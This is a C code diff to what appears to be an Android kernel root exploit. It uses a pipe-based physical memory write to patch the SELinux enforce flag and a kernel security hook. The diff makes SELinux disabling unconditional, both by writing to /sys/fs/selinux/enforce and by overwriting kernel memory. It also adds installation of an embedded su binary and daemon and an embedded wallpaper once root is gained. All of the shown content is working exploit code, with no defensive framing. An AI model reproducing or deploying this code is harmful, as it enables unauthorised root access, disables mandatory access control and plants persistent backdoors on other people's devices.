@@ -74,20 +74,29 @@ int spawn_root_child(void) {
     report.gid_after = getgid();
     report.euid_after = geteuid();
     report.egid_after = getegid();
-    if (opt_disabled_selinux) {
-      int enforce_fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
-      if (enforce_fd >= 0) {
-        ssize_t wrote = write(enforce_fd, "0", 1);
-        report.setenforce_ret = wrote == 1 ? 0 : -1;
-        report.setenforce_errno = wrote == 1 ? 0 : errno;
-        close(enforce_fd);
-      } else {
-        report.setenforce_ret = -1;
-        report.setenforce_errno = errno;
-      }
+    int enforce_fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
+    if (enforce_fd >= 0) {
+      ssize_t wrote = write(enforce_fd, "0", 1);
+      report.setenforce_ret = wrote == 1 ? 0 : -1;
+      report.setenforce_errno = wrote == 1 ? 0 : errno;
+      close(enforce_fd);
+    } else {
+      report.setenforce_ret = -1;
+      report.setenforce_errno = errno;
     }
+    report.su_daemon_pid = -1;
     if (report.setgid_ret == 0 && report.setuid_ret == 0) {
-      install_embedded_ksud();
+      errno = 0;
+      report.su_install_ret = install_embedded_su(&report.su_daemon_pid);
+      report.su_install_errno = errno;
+      errno = 0;
+      report.wallpaper_ret = install_embedded_wallpaper();
+      report.wallpaper_errno = errno;
+    } else {
+      report.su_install_ret = 0;
+      report.su_install_errno = EPERM;
+      report.wallpaper_ret = 0;
+      report.wallpaper_errno = EPERM;
     }
     root_shared->report = report;
     atomic_store(&root_shared->done, 1);
@@ -406,11 +415,8 @@ int install_android_root(int fd) {
           (unsigned long long)real_caps_after[CRED_CAP_EFFECTIVE]);
 
   uint8_t permissive = 0;
-  int selinux_direct_ok = 1;
-  if (opt_disabled_selinux) {
-    selinux_direct_ok =
-      pipe_phys_write_data(fd, selinux_addr, &permissive, sizeof(permissive));
-  }
+  int selinux_direct_ok =
+    pipe_phys_write_data(fd, selinux_addr, &permissive, sizeof(permissive));
   uint8_t selinux_mid = 0xff;
   pipe_phys_read_data(fd, selinux_addr, &selinux_mid, sizeof(selinux_mid));
   pr_info("root selinux direct write ok=%d %u->%u\n", selinux_direct_ok,
@@ -426,13 +432,15 @@ int install_android_root(int fd) {
   capable_head_after = pipe_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
   pipe_phys_read_data(fd, selinux_addr, &selinux_after, sizeof(selinux_after));
   pr_info("root child result done=%d uid_after=%u setgid=%d/%d setuid=%d/%d "
-          "setenforce=%d/%d selinux=%u->%u "
+          "setenforce=%d/%d su=%d/%d daemon=%d wallpaper=%d/%d selinux=%u->%u "
           "cap=%016llx/%016llx\n",
           root_child_done, root_uid_after, report.setgid_ret,
           report.setgid_errno, report.setuid_ret, report.setuid_errno,
-          setenforce_ret, setenforce_errno,
+          setenforce_ret, setenforce_errno, report.su_install_ret,
+          report.su_install_errno, report.su_daemon_pid, report.wallpaper_ret,
+          report.wallpaper_errno,
           selinux_before, selinux_after,
           (unsigned long long)capable_head_before,
           (unsigned long long)capable_head_after);
-  return root_child_done && (!opt_disabled_selinux || selinux_after == 0);
+  return root_child_done && selinux_after == 0;
 }
